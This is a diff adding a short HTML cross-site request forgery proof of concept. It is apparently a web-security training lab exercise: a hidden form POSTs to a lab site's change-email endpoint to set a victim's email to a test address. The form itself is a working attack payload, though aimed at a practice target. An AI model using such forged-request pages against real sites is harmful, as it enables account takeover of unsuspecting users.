@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <form action="https://anon.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="wiener@test.net">
+        <input type="submit" value="Submit">
+    </form>
+</body>
+</html>
